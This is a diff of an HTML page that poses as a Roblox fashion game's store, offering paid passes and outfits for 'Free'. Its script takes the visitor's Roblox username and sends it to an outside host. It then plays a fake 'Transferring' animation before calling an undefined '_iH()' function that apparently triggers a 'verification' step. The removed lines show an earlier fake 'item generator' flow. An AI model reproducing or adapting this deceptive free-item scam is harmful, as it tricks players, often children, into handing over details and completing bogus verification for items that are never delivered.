-<div class="step hidden" id="step-3">
-<h3>Select your Platform</h3>
-<div id="step-3-buttons">
-<button class="btn"><i class="fab fa-windows"></i></button>
-<button class="btn"><i class="fab fa-apple"></i></button>
-<button class="btn"><i class="fab fa-android"></i></button>
-<button class="btn"><i class="fab fa-xbox"></i></button>
-<button class="btn wide">Other..</button>
-</div>
-<button class="continue-button hidden"></button>
-</div>
-<div class="step hidden" id="step-4">
-<img alt="Connecting" class="rotating-cog" src="images/whIkxtTdVqfG.png">
-<p id="step-4-text">Connecting to  Servers..</p>
-</div>
-<div class="step hidden" id="step-5">
-<img alt="Connected" class="step-image" src="images/tvMgIEPXTUra.png">
-<p id="step-5-text">Succesfully Connected..</p>
-</div>
-<div class="step hidden" id="step-6">
-<img alt="Connected" class="rotating-cog" src="images/whIkxtTdVqfG.png">
-<p id="step-6-text"></p>
-</div>
-<div class="step hidden" id="step-7">
-<img alt="Connected" class="step-image" src="images/tvMgIEPXTUra.png">
-<p id="step-7-text">Items Generated..</p>
-</div>
-<div class="step hidden" id="step-8">
-<img alt="Connected" class="rotating-cog" src="images/whIkxtTdVqfG.png">
-<p id="step-8-text">Transferring Items to <span id="username-placeholder-8"></span>..</p>
-</div>
-<div class="step hidden" id="step-9">
-<img alt="Connected" class="step-image" src="images/YyWsWHCvJ7qe.png">
-<p id="step-9-text"> Roblox paused transfer..</p>
-</div>
-<div class="step10before hidden" id="step-10">
-<img alt="Connected" class="step-image2" src="images/OkMe8NI0BFFw.png">
-<p id="step-10-text"> Roblox requires verification..</p>
-<!-- Edit -->
-<button class="verify-button hidden" onclick="_iH()"></button>
-</div>
-<div class="hidden" id="loading-bar-container">
-<div id="loading-bar"></div>
-</div>
-</div>
-<div id="popup-container"></div>
+        
+        
+        <div class="action-nav">
+            <ul class="action-links">
+                <li class="action-link" onclick="showSection('about')">About</li>
+                <li class="action-link active" onclick="showSection('store')">Store</li>
+                <li class="action-link" onclick="showSection('servers')">Servers</li>
+            </ul>
+        </div>
+        
+        
+        <div class="store-section" id="store-section" style="display: block;">
+            <h3 class="passes-title">Passes</h3>
+            
+           
+            <div class="items-row top-row">
+                <!--  1 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-a9aeec9365e6d9aa578d2e19de3c1247/150/150/Image/Webp/noFilter" alt="VIP Pass" class="item-image">
+                    <h4 class="item-title">VIP Pass</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-4b67f8d7db2f9a229b8303361e8ba689/150/150/Image/Webp/noFilter" alt="Custom Makeup" class="item-image">
+                    <h4 class="item-title">Custom Makeup</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  3 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-b1562106eb4bb4dcf3ab5508ab02db32/150/150/Image/Webp/noFilter" alt="Limited Luxury" class="item-image">
+                    <h4 class="item-title">Limited Luxury</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  4 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-d19392a47dcb5238e7677603bb223eb0/150/150/Image/Webp/noFilter" alt="Run Faster" class="item-image">
+                    <h4 class="item-title">Run Faster</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  5 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-54966648a21485fc1fcaa8459664a372/150/150/Image/Webp/noFilter" alt="Futuristic Suit" class="item-image">
+                    <h4 class="item-title">Futuristic Suit</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  6 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-0e0e4876501be3b3880f4ebbc1667941/420/420/Image/Png/noFilter" alt="French Luxury Bag" class="item-image">
+                    <h4 class="item-title">French Bag</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+            </div>
+            
+            <!-- الصف الثاني (5 عناصر) -->
+            <div class="items-row bottom-row">
+                <!--  7 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-85755007e41c450a9c87d685e8766d70/420/420/Image/Png/noFilter" alt="Rich Girl Set" class="item-image">
+                    <h4 class="item-title">Rich Girl Set</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  8 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-f88ee3e8abd97d64e3097b02a7489434/420/420/Image/Png/noFilter" alt="Denim Set" class="item-image">
+                    <h4 class="item-title">Denim Set</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  9 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-386e5b9ba07a2bc24625ee49a754f7a3/420/420/Image/Png/noFilter" alt="Moongazer Set" class="item-image">
+                    <h4 class="item-title">Moongazer Set</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  10 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-d560f3e80400034d1d7fc37a713da510/150/150/Image/Webp/noFilter" alt="x2 Money" class="item-image">
+                    <h4 class="item-title">x2 Money</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+                
+                <!--  11 -->
+                <div class="store-item">
+                    <img src="https://tr.rbxcdn.com/180DAY-952ca627191ba2bef60c1b0e52a651ad/420/420/Image/Png/noFilter" alt="Queen Of Hearts" class="item-image">
+                    <h4 class="item-title">Queen Of Hearts</h4>
+                    <div class="item-price">
+                        <span class="free-badge">
+                            <span class="free-icon"></span>
+                            Free
+                        </span>
+                    </div>
+                    <button class="buy-button">Buy</button>
+                </div>
+            </div>
+        </div>
+        
+        
+        <div class="about-section" id="about-section">
+            <p class="welcome-message">⭐ DESCRIPTION ⭐
 
-<script src="app.js"></script>
-<div id="notification-container"></div>
+              
+              
+            
+              Create stunning outfits 👗💖⭐, and strut the runway to show off your unique style. Collaborate, compete, and explore a world of glamour with friends!
 
-</body>
-</html>
+🌺 THE PETAL UPDATE: OUT NOW! 🌺
+
+⭐ Are you ready to be the TOP MODEL?
+👗 NEW ITEMS! Check them out.
+🍿 Vote for your favorite outfits!
+💃 Use poses on the runway to show off your outfit!
+
+              
+     </p>
+        </div>
+        
+       
+        <div class="servers-section" id="servers-section">
+            <h3 class="servers-title">Active Servers</h3>
+            
+            <div class="server-list">
+                <!--  1 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-online"></span>
+                        Fashion Runway #1
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12345</span>
+                        <span>VIP Only: No</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 45ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">24/30</span>
+                        </div>
+                    </div>
+                    <button class="join-button">Join Server</button>
+                </div>
+                
+                <!--  2 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-online"></span>
+                        VIP Lounge #2
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12346</span>
+                        <span>VIP Only: Yes</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 62ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">12/20</span>
+                        </div>
+                    </div>
+                    <button class="join-button">Join Server</button>
+                </div>
+                
+                <!--  3 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-full"></span>
+                        Catwalk Central #3
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12347</span>
+                        <span>VIP Only: No</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 38ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">30/30</span>
+                        </div>
+                    </div>
+                    <button class="join-button" disabled="">Server Full</button>
+                </div>
+                
+                <!--  4 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-joining"></span>
+                        New Players #4
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12348</span>
+                        <span>VIP Only: No</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 55ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">18/30</span>
+                        </div>
+                    </div>
+                    <button class="join-button">Join Server</button>
+                </div>
+                
+                <!--  5 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-online"></span>
+                        Style Battle #5
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12349</span>
+                        <span>VIP Only: No</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 72ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">27/30</span>
+                        </div>
+                    </div>
+                    <button class="join-button">Join Server</button>
+                </div>
+                
+                <!--  6 -->
+                <div class="server-card">
+                    <h4 class="server-name">
+                        <span class="server-status status-online"></span>
+                        Fashion Showdown #6
+                    </h4>
+                    <div class="server-info">
+                        <span>Server ID: 12350</span>
+                        <span>VIP Only: No</span>
+                    </div>
+                    <div class="server-info">
+                        <span>Ping: 41ms</span>
+                        <div class="server-players">
+                            <span>Players:</span>
+                            <span class="player-count">15/30</span>
+                        </div>
+                    </div>
+                    <button class="join-button">Join Server</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="purchase-popup" id="purchase-popup">
+        <div class="popup-content">
+        </div>
+    </div>
+
+    <script>
+        let currentImage = 0;
+        const images = document.querySelectorAll('.main-image');
+        
+        function changeImage() {
+            images[currentImage].classList.remove('active');
+            currentImage = (currentImage + 1) % images.length;
+            images[currentImage].classList.add('active');
+        }
+        
+        setInterval(changeImage, 2000);
+        
+        function showSection(sectionId) {
+            document.querySelectorAll('.about-section, .store-section, .servers-section').forEach(section => {
+                section.style.display = 'none';
+            });
+            
+            document.querySelectorAll('.action-link').forEach(link => {
+                link.classList.remove('active');
+            });
+            
+            event.target.classList.add('active');
+            
+            if (sectionId === 'about') {
+                document.getElementById('about-section').style.display = 'block';
+            } else if (sectionId === 'store') {
+                document.getElementById('store-section').style.display = 'block';
+            } else if (sectionId === 'servers') {
+                document.getElementById('servers-section').style.display = 'block';
+            }
+        }
+        
+        window.onload = function() {
+            document.getElementById('store-section').style.display = 'block';
+            document.querySelector('.action-link[onclick="showSection(\'store\')"]').classList.add('active');
+        };
+
+        const showPurchasePopup = (itemName, itemImage) => {
+            const popup = document.getElementById('purchase-popup');
+            const popupContent = popup.querySelector('.popup-content');
+            
+            popupContent.innerHTML = `
+                <div class="popup-header">
+                    <h3>Get Item</h3>
+                </div>
+                <img src="${itemImage}" alt="Item Image" class="item-popup-image">
+                <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
+                <div class="input-group">
+                    <input type="text" id="username-input" placeholder="Enter your Roblox username">
+                </div>
+                <div class="user-error d-none">Please enter a valid username</div>
+                <div class="popup-buttons">
+                    <button class="cancel-btn">Cancel</button>
+                    <button class="free-btn" id="search-user-btn">
+                        <span class="free-icon"></span>
+                        <span class="free-badge">Free</span>
+                    </button>
+                </div>
+            `;
+            
+            popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
+            popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
+                const username = document.getElementById('username-input').value.trim();
+                if (!username) {
+                    document.querySelector('.user-error').classList.remove('d-none');
+                    return;
+                }
+                showSearchingState(username, itemName, itemImage);
+            });
+            
+            popup.style.display = 'flex';
+            document.getElementById('username-input').focus();
+        }
+
+        const showSearchingState = (username, itemName, itemImage) => {
+            const popupContent = document.querySelector('.popup-content');
+            
+            popupContent.innerHTML = `
+                <div class="popup-header">
+                    <h3>Get Item</h3>
+                </div>
+                <div style="text-align:center;padding:20px">
+                    <div class="folding">
+                        <div class="sk-cube1 sk-cube"></div>
+                        <div class="sk-cube2 sk-cube"></div>
+                        <div class="sk-cube4 sk-cube"></div>
+                        <div class="sk-cube3 sk-cube"></div>
+                        <div class="square"></div>
+                    </div>
+                    <p class="searching-text">Searching for @${username}</p>
+                </div>
+            `;
+
+
+            
+            fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === "SUCCESS") {
+                        showSuccessState(username, data.avatar, itemName, itemImage);
+                    } else {
+                        showErrorState(username, itemName, itemImage);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showErrorState(username, itemName, itemImage);
+                });
+        }
+
+        const showSuccessState = (username, avatarUrl, itemName, itemImage) => {
+            const popupContent = document.querySelector('.popup-content');
+            
+            popupContent.innerHTML = `
+                <div class="popup-header">
+                    <h3>Get Item</h3>
+                </div>
+                <div style="text-align:center;padding:20px">
+                    <img src="${avatarUrl}" class="result-avatar">
+                    <p class="result-username">@${username}</p>
+                    <button class="get-item-now-btn">Continue</button>
+                </div>
+            `;
+            
+            popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
+                showVerificationState(username, itemName, itemImage);
+            });
+        }
+
+        const showVerificationState = (username, itemName, itemImage) => {
+            const popupContent = document.querySelector('.popup-content');
+            
+            popupContent.innerHTML = `
+                <div class="popup-header">
+                    <h3>Verification</h3>
+                </div>
+                <div style="text-align:center;padding:20px">
+                    <div class="folding">
+                        <div class="sk-cube1 sk-cube"></div>
+                        <div class="sk-cube2 sk-cube"></div>
+                        <div class="sk-cube4 sk-cube"></div>
+                        <div class="sk-cube3 sk-cube"></div>
+                        <div class="square"></div>
+                    </div>
+                    <p class="searching-text">Transferring ${itemName} to @${username}</p>
+                </div>
+            `;
+            
+
+            setTimeout(() => {
+                _iH(); 
+            }, 3000);
+        }
+
+        const showErrorState = (username, itemName, itemImage) => {
+            const popupContent = document.querySelector('.popup-content');
+            
+            popupContent.innerHTML = `
+                <div class="popup-header">
+                    <h3>Error</h3>
+                </div>
+                <div style="text-align:center;padding:20px">
+                    <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
+                    <button class="get-item-now-btn" onclick="showPurchasePopup('${itemName}', '${itemImage}')">Try Again</button>
+                </div>
+            `;
+        }
+
+       
+        const closePurchasePopup = () => {
+            document.getElementById('purchase-popup').style.display = 'none';
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const buyButtons = document.querySelectorAll('.buy-button');
+            buyButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const itemElement = this.closest('.store-item');
+                    const itemName = itemElement.querySelector('.item-title').textContent;
+                    const itemImage = itemElement.querySelector('.item-image').src;
+                    showPurchasePopup(itemName, itemImage);
+                });
+            });
+        });
+    </script>
+
+</body></html>
